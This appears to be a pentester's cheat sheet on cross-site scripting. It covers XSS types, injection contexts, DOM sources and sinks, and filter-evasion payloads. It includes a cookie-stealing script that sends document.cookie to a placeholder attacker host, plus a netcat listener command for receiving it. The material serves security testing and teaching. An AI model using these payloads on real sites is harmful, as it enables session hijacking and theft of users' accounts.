# 3. Cross-Site Scripting (XSS)

XSS (Cross-Site Scripting) is a vulnerability that allows an attacker to inject malicious JavaScript into a web page, which then executes in another user's browser.

**The Main Types:**

- **Reflected XSS** → Payload comes from the request and is immediately reflected.
    
- **Stored XSS** → Payload is saved on the server and executes when the page is viewed.
    
- **DOM XSS** → Client-side JavaScript creates the vulnerability (Source to Sink).
    
- **Blind XSS** → Payload executes later in another user’s browser, often an admin.
    

## Break / Test

**Basic Payloads:**

```
<script>alert(1)</script>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
```

**Inside an HTML attribute:**

```
"><script>alert(1)</script>
```

**DOM-based:**

```
<img src=x onerror="alert(1)">
```

**Cookie Callback (Exfiltration):**

```
<script>
fetch('http://ATTACKER:9001/?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(document.location))
</script>
```

_Note: If_ `_HttpOnly_` _is set,_ `_document.cookie_` _returns nothing for those protected cookies. Other attacks may still be possible depending on the application's functionality and protections._

**Listener (on your attack machine):**

```
nc -nlvp 9001
```

_Note: For Blind XSS, use a tool like XSS Hunter. It can capture details such as the DOM, screenshot, and URL, depending on the tool's capabilities and configuration._

## Identifying Context (Where does your input land?)

The context determines how input must be handled to prevent JavaScript execution.

- **HTML body** → `<script>alert(1)</script>`
    
- **HTML attribute** → `"><script>alert(1)</script>`
    
- **JS String** → `';alert(1);//`
    
- **Textarea** → `</textarea><script>alert(1)</script>`
    
- **DOM sink** → `<img src=x onerror=alert(1)>`
    

## DOM XSS (Sources & Sinks)

To find DOM XSS, inspect the client-side JavaScript source for these patterns.

**DOM Sources (Where input enters):**

- `location.search`
    
- `location.hash`
    
- `document.referrer`
    
- `window.name`
    

**DOM Sinks (Where input may be interpreted unsafely):**

- `eval()`
    
- `innerHTML`
    
- `document.write()`
    
- `location.href`
    
- `setTimeout()`
    

## WAF Bypass

When testing filters in an authorized lab, compare how different inputs are handled.

**Alternative test payloads:**

```
<!-- Different popups -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- Encoded execution (Base64 for alert(1)) -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))
```

**String manipulation:**

```
<img src=x onerror="window['al'+'ert'](1)">
```

_Note: A strict Content Security Policy (CSP) can block many inline scripts and event handlers. Assess the actual policy and its permitted script sources._
